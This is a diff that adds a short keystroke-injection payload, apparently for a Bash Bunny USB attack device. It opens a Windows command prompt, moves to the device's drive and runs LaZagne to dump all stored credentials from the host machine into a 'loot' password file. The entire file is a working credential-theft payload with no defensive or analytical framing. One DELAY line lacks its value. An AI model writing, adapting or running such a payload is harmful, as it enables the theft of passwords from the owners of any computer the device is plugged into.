@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 200
+REM r is drive letter of the BB that I want to export the plain text file too
+REM if there is a better way to export it to the bash bunny without permanently assigning the r letter, be my guest.
+STRING r:
+ENTER
+STRING cd payloads\switch1
+ENTER
+STRING lazagne.exe all > r:\loot\Pswrds.txt
+ENTER
+DELAY 
+STRING exit
+ENTER
